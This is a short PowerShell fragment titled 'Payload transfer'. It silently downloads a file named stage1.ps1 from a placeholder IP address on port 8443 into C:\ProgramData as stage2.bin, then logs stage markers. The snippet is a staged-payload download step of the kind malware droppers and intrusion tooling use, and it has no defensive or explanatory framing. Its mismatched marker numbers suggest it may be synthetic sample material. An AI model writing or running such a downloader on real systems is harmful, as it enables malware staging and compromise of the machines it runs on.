
# Payload transfer
$TargetUrl = "https://192.0.2.207:8443/stage1.ps1"
$Stage2Path = 'C:\ProgramData\stage2.bin'
curl.exe -s -L -o $Stage2Path $TargetUrl
Write-Verbose "stage marker 36 reached"
$StageMarker = "stage-41"
